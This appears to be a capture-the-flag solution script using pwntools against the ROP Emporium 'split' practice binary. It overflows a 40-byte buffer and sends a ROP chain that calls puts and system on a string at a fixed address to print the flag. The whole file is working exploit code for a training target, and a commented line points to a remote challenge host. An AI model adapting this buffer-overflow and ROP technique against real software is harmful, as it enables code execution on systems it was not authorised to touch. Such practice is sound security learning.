from encodings import utf_8
from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")
# context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 40

elf = context.binary = ELF("./split")

rop = ROP([elf])

p = elf.process()

p.recvuntil("Contriving a reason to ask user for data...")
p.recvline()

secret_str = int(hex(0x601060),0)

rop.call("puts", [secret_str])
rop.call("system", [secret_str])

payload = [
    
    b"A" * offset, 
    rop.chain()
    
]

payload = b"".join(payload)

p.send(payload)

print(rop.dump())

p.recvuntil("\n")

log.info(f"This is the super secret strig : {p.recvline().decode('utf-8')}")
log.info(f"This is the flag : {p.recvline().decode('utf-8')}")

# print(p.recvline())
# print(p.recvline())

# libc = elf.libc

# p = connect('spclr.ch', 1337)
